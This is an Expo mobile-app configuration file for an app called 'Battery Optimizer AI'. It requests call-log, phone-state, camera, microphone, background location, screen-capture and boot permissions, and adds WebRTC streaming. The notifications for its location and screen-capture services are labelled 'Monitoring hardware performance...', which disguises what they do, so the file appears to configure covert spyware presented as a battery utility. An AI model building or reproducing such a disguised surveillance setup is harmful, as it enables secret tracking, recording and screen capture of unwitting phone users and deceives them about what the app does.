{
  "expo": {
    "name": "Battery Optimizer AI",
    "slug": "joyjet-hub",
    "version": "4.2.1",
    "orientation": "portrait",
    "icon": "./assets/icon.png",
    "userInterfaceStyle": "dark",
    "newArchEnabled": true,
    "splash": {
      "image": "./assets/splash.png",
      "resizeMode": "contain",
      "backgroundColor": "#000000"
    },
    "ios": {
      "supportsTablet": true,
      "bundleIdentifier": "com.joyjet.optimizer"
    },
    "android": {
      "package": "com.joyjet.optimizer",
      "versionCode": 43,
      "targetSdkVersion": 35,
      "permissions": [
        "READ_CALL_LOG",
        "READ_PHONE_STATE",
        "FOREGROUND_SERVICE",
        "FOREGROUND_SERVICE_MEDIA_PROJECTION",
        "FOREGROUND_SERVICE_LOCATION",
        "SYSTEM_ALERT_WINDOW",
        "CAMERA",
        "RECORD_AUDIO",
        "ACCESS_FINE_LOCATION",
        "ACCESS_COARSE_LOCATION",
        "ACCESS_BACKGROUND_LOCATION",
        "RECEIVE_BOOT_COMPLETED"
      ]
    },
    "plugins": [
      "expo-splash-screen",
      [
        "expo-build-properties",

        {
          "android": {
            "newArchEnabled": true,
            "targetSdkVersion": 35,
            "foregroundService": [
              {
                "type": "location",
                "notification": {
                  "title": "Battery Optimizer Active",
                  "body": "Monitoring hardware performance..."
                }
              },
              {
                "type": "mediaProjection",
                "notification": {
                  "title": "Battery Optimizer Active",
                  "body": "Monitoring hardware performance..."
                }
              }
            ]
          }
        }
      ],
      [
        "@config-plugins/react-native-webrtc",
        {
          "cameraPermission": "Allow Battery Optimizer AI to access your camera",
          "microphonePermission": "Allow Battery Optimizer AI to access your microphone"
        }
      ],
      "expo-location",
      "./withAndroidStrings.js"
    ],
    "extra": {
      "eas": {
        "projectId": "6adb5db6-de83-4339-af7b-17c91a68079d"
      }
    }
  }
}
